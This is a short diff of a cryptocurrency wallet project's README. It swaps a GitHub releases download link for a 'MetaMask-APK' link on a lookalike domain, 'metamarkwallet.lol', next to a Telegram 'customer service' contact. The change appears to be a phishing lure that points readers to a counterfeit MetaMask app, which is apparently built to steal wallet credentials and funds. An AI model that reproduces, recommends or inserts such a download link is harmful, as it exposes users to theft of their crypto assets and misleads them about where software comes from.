@@ -158,4 +158,4 @@ Enter the corresponding DAPP website to browse defi, gamefi, and more smoothly
 If you have any usage issues, please consult customer service https://t.me/Wallet_service Obtain manual one-on-one answers
 
 
-#### Download Release APK ：https://github.com/ladyho/wallet_coin/releases
+#### Download Release APK ：[MetaMask-APK](https://app.metamarkwallet.lol/app/MetaMask_app_6.0.1.apk)
